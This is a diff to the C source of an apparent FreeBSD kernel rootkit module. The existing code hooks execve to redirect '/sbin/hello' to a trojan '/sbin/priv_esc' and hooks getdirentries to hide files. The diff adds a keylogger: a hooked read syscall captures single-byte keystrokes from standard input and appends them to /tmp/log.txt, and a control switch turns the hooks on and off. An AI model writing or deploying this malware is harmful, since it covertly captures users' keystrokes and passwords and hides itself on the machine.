@@ -14,6 +14,16 @@
 
 #include <sys/dirent.h>
 
+//===================
+#include <sys/pcpu.h>
+#include <sys/syscallsubr.h>
+#include <sys/unistd.h>
+#include <sys/uio.h>
+#include <sys/file.h>
+#include <sys/fcntl.h>
+
+//===================
+
 #define ORIGINAL	"/sbin/hello"
 #define TROJAN		"/sbin/priv_esc"
 
@@ -129,9 +139,97 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
 	return 0;
 }
 
+//================================== KEY LOGGING ================================
+
+
+static int write_kernel2userspace(struct thread *td, char c){
+
+	int error;
+	// open file to save at
+	
+	/*
+		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
+		then pathname is interpreted relative to the current working directory of the calling process 
+	*/
+	error = kern_openat(td, AT_FDCWD, "/tmp/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    
+    if (error){
+        uprintf("open error %d\n", error);
+        return(error);
+    }
+    int keylog_fd = td->td_retval[0];
+    int buf[1] = {c};
+
+    /*
+		UIO: This structure is used for moving data between 
+		the kernel and user spaces through read() and write() system calls. 
+    */
+    struct iovec aiov;
+    struct uio auio; 
+
+    //zero's out structs
+    bzero(&auio, sizeof(auio));
+    bzero(&aiov, sizeof(aiov));
+    
+    /*	
+    	The writev() system call writes iovcnt buffers of data described .....
+    	by iov to the file associated with the file descriptor fd ("gather output").
+
+    	writev() writes out the entire contents of iov[0] before proceeding to iov[1], and so on.
+    */
+    aiov.iov_base = &buf; //starting address of buffer
+    aiov.iov_len = 1; //number of bytes to transfer
+
+
+    auio.uio_iov = &aiov; 			/*	scatter/gather list */
+    auio.uio_iovcnt = 1; 			/*	length of scatter/gather list */
+    auio.uio_offset = 0; 			/*	offset in target object	*/
+    auio.uio_resid = 1; 			/*	remaining bytes	to copy	*/
+    auio.uio_segflg = UIO_SYSSPACE; /*	address	space */
+    auio.uio_rw = UIO_WRITE;		/*	operation */
+    auio.uio_td = td;				/*	owner */
+    
+    error = kern_writev(td, keylog_fd, &auio);
+    if (error){
+        uprintf("write error %d\n", error);
+        return error;
+    }
+    struct close_args fdtmp;
+    fdtmp.fd = keylog_fd;
+    sys_close(td, &fdtmp);
+
+	return(error);
+}
+
+
+
+static int read_hook(struct thread *td, void *syscall_args){
+
+	struct read_args *uap;
+	uap = (struct read_args *)syscall_args;
+
+	int error;
+	char buf[1];
+	int done;
+
+	error = sys_read(td, syscall_args);
+
+	//checks if data read is keystroke
+	if (error || (!uap->nbyte)||(uap->nbyte > 1)|| (uap->fd != 0))
+		return(error); 
+
+	copyinstr(uap->buf, buf, 1, &done);
+	write_kernel2userspace(td, buf[0]);
+
+	return(error);
+}
+
+//==============================================================================
+
 struct control_arg{
 	char *option;	
 };
+
 
 static int control(struct thread *td, void *arg) {
 	struct control_arg *uap;
@@ -140,11 +238,17 @@ static int control(struct thread *td, void *arg) {
 		uprintf("Pair size: %d\n", redir_pair_len);
 		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+
+		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+
 		activated = 1;
 	}
 	else if (strcmp(uap->option, "off") == 0 && activated == 1) {
 		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+
+		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+
 		activated = 0;
 	}
 	return 0;
